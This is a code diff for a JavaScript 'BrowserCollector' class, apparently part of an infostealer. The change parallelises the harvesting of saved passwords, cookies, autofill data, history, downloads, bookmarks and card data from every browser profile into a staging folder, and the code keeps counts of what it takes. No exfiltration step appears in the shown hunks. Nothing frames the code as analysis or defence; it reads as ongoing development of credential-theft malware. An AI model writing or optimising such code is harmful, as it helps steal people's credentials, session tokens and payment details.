@@ -124,19 +124,24 @@ class BrowserCollector {
         try {
             const results = {};
 
-            for (const [browserKey, browserConfig] of Object.entries(this.browsers)) {
+            const browserPromises = Object.entries(this.browsers).map(async ([browserKey, browserConfig]) => {
                 try {
                     const browserResult = await this.collectBrowserData(browserKey, browserConfig);
-                    results[browserKey] = browserResult;
+                    return [browserKey, browserResult];
                 } catch (error) {
                     ErrorHandler.handle(
                         new ModuleError(`Failed to collect data from ${browserConfig.name}`, 'browsers'),
                         null,
                         { browser: browserKey }
                     );
-                    results[browserKey] = { error: error.message };
+                    return [browserKey, { error: error.message }];
                 }
-            }
+            });
+
+            const browserResults = await Promise.all(browserPromises);
+            browserResults.forEach(([browserKey, result]) => {
+                results[browserKey] = result;
+            });
 
             // Update global statistics
             stats.addBrowser(this.totalStats);
@@ -177,20 +182,25 @@ class BrowserCollector {
             return browserStats;
         }
 
-        for (const profile of profiles) {
+        const profilePromises = profiles.map(async (profile) => {
             try {
-                const profileStats = await this.collectProfileData(browserKey, browserConfig, profile);
-                
-                // Aggregate statistics
-                for (const key of Object.keys(browserStats)) {
-                    if (typeof browserStats[key] === 'number' && key !== 'profiles') {
-                        browserStats[key] += profileStats[key] || 0;
-                    }
-                }
+                return await this.collectProfileData(browserKey, browserConfig, profile);
             } catch (error) {
                 logger.debug(`Failed to collect profile data: ${profile.name}`, error.message);
+                return { passwords: 0, cookies: 0, history: 0, downloads: 0, bookmarks: 0, cards: 0 };
             }
-        }
+        });
+
+        const profileResults = await Promise.all(profilePromises);
+        
+        // Aggregate statistics
+        profileResults.forEach(profileStats => {
+            for (const key of Object.keys(browserStats)) {
+                if (typeof browserStats[key] === 'number' && key !== 'profiles') {
+                    browserStats[key] += profileStats[key] || 0;
+                }
+            }
+        });
 
         // Add to total statistics
         for (const key of Object.keys(this.totalStats)) {
@@ -247,36 +257,42 @@ class BrowserCollector {
         const profileFolder = `Browsers\\${browserConfig.name}\\${profile.name.replace(/[^a-zA-Z0-9]/g, '_')}`;
 
         // Collect different types of data
-        for (const [dataType, fileName] of Object.entries(browserConfig.files)) {
+        const dataPromises = Object.entries(browserConfig.files).map(async ([dataType, fileName]) => {
             try {
                 const filePath = path.join(profile.path, fileName);
                 const count = await this.collectDataFile(filePath, profileFolder, dataType, fileName, browserKey, profile.path);
-                
-                // Map data types to stats
-                switch (dataType) {
-                case 'passwords':
-                    profileStats.passwords += count;
-                    break;
-                case 'cookies':
-                    profileStats.cookies += count;
-                    break;
-                case 'autofill':
-                    profileStats.autofills += count;
-                    break;
-                case 'history':
-                    profileStats.history += count;
-                    break;
-                case 'downloads':
-                    profileStats.downloads += count;
-                    break;
-                case 'bookmarks':
-                    profileStats.bookmarks += count;
-                    break;
-                }
+                return { dataType, count };
             } catch (error) {
                 logger.debug(`Failed to collect ${dataType} from ${profile.name}`, error.message);
+                return { dataType, count: 0 };
             }
-        }
+        });
+
+        const dataResults = await Promise.all(dataPromises);
+        
+        // Map data types to stats
+        dataResults.forEach(({ dataType, count }) => {
+            switch (dataType) {
+            case 'passwords':
+                profileStats.passwords += count;
+                break;
+            case 'cookies':
+                profileStats.cookies += count;
+                break;
+            case 'autofill':
+                profileStats.autofills += count;
+                break;
+            case 'history':
+                profileStats.history += count;
+                break;
+            case 'downloads':
+                profileStats.downloads += count;
+                break;
+            case 'bookmarks':
+                profileStats.bookmarks += count;
+                break;
+            }
+        });
 
         return profileStats;
     }
